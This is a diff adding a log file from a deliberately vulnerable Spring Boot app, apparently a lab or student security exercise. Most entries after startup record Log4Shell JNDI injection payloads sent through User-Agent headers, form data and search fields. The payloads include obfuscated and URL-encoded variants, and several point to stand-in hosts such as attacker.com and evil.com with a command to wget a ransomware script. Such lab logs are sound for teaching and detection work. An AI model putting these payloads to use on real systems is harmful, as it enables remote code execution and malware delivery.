@@ -1,0 +1,30 @@
+2025-10-30 22:25:19.052 [main] INFO  com.miempresa.VulnerableApp - Starting VulnerableApp using Java 17.0.12 on DESKTOP-DE8MRTV with PID 17332 (C:\Users\ADMIN\Desktop\sptiproject\target\classes started by ADMIN in C:\Users\ADMIN\Desktop\sptiproject)
+2025-10-30 22:25:19.071 [main] DEBUG com.miempresa.VulnerableApp - Running with Spring Boot v2.6.1, Spring v5.3.13
+2025-10-30 22:25:19.072 [main] INFO  com.miempresa.VulnerableApp - No active profile set, falling back to default profiles: default
+2025-10-30 22:25:20.088 [main] INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer - Tomcat initialized with port(s): 8080 (http)
+2025-10-30 22:25:20.118 [main] INFO  org.apache.coyote.http11.Http11NioProtocol - Initializing ProtocolHandler ["http-nio-8080"]
+2025-10-30 22:25:20.119 [main] INFO  org.apache.catalina.core.StandardService - Starting service [Tomcat]
+2025-10-30 22:25:20.120 [main] INFO  org.apache.catalina.core.StandardEngine - Starting Servlet engine: [Apache Tomcat/9.0.55]
+2025-10-30 22:25:20.203 [main] INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] - Initializing Spring embedded WebApplicationContext
+2025-10-30 22:25:20.204 [main] INFO  org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext - Root WebApplicationContext: initialization completed in 1060 ms
+2025-10-30 22:25:20.520 [main] INFO  org.apache.coyote.http11.Http11NioProtocol - Starting ProtocolHandler ["http-nio-8080"]
+2025-10-30 22:25:20.575 [main] INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer - Tomcat started on port(s): 8080 (http) with context path ''
+2025-10-30 22:25:20.588 [main] INFO  com.miempresa.VulnerableApp - Started VulnerableApp in 1.898 seconds (JVM running for 2.74)
+2025-10-30 22:26:54.745 [http-nio-8080-exec-1] INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] - Initializing Spring DispatcherServlet 'dispatcherServlet'
+2025-10-30 22:26:54.746 [http-nio-8080-exec-1] INFO  org.springframework.web.servlet.DispatcherServlet - Initializing Servlet 'dispatcherServlet'
+2025-10-30 22:26:54.747 [http-nio-8080-exec-1] INFO  org.springframework.web.servlet.DispatcherServlet - Completed initialization in 0 ms
+2025-10-30 22:26:54.789 [http-nio-8080-exec-1] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${jndi:ldap://attacker-malicious.com:1389/Exploit}
+2025-10-30 22:27:01.984 [http-nio-8080-exec-3] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${jndi:dns://attacker.com/securitytest}
+2025-10-30 22:26:55.974 [http-nio-8080-exec-2] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${${lower:j}ndi:${lower:l}dap://attacker.com/}
+2025-10-30 22:33:44.896 [http-nio-8080-exec-5] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${jndi:ldap://attacker.com:1389/cmd/wget+http://attacker.com/ransomware.py}
+2025-10-30 22:33:50.927 [http-nio-8080-exec-7] ERROR com.miempresa.VulnerableApp - Datos procesados: data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%3A1389%2Fcmd%2Fwget%2Bhttp%3A%2F%2Fattacker.com%2Fransomware.py%7D
+2025-10-30 22:33:51.937 [http-nio-8080-exec-8] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${jndi:ldap://evil.com:1389/Exploit}
+2025-10-30 22:33:57.974 [http-nio-8080-exec-10] ERROR com.miempresa.VulnerableApp - Datos procesados: data=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%3A1389%2FExploit%7D
+2025-10-30 22:33:54.947 [http-nio-8080-exec-9] WARN  com.miempresa.VulnerableApp - Busqueda ejecutada: ${jndi:ldap://evil.com:1389/Exploit}
+2025-10-30 22:33:47.918 [http-nio-8080-exec-6] WARN  com.miempresa.VulnerableApp - Busqueda ejecutada: ${jndi:ldap://attacker.com:1389/cmd/wget http://attacker.com/ransomware.py}
+2025-10-30 22:39:46.353 [http-nio-8080-exec-5] ERROR com.miempresa.VulnerableApp - Datos procesados: data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%3A1389%2Fcmd%2Fwget%2Bhttp%3A%2F%2Fattacker.com%2Fransomware.py%7D
+2025-10-30 22:39:47.360 [http-nio-8080-exec-7] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${jndi:ldap://evil.com:1389/Exploit}
+2025-10-30 22:39:53.409 [http-nio-8080-exec-10] ERROR com.miempresa.VulnerableApp - Datos procesados: data=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%3A1389%2FExploit%7D
+2025-10-30 22:39:50.381 [http-nio-8080-exec-8] WARN  com.miempresa.VulnerableApp - Busqueda ejecutada: ${jndi:ldap://evil.com:1389/Exploit}
+2025-10-30 22:39:40.336 [http-nio-8080-exec-3] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${jndi:ldap://attacker.com:1389/cmd/wget+http://attacker.com/ransomware.py}
+2025-10-30 22:39:43.346 [http-nio-8080-exec-2] WARN  com.miempresa.VulnerableApp - Busqueda ejecutada: ${jndi:ldap://attacker.com:1389/cmd/wget http://attacker.com/ransomware.py}
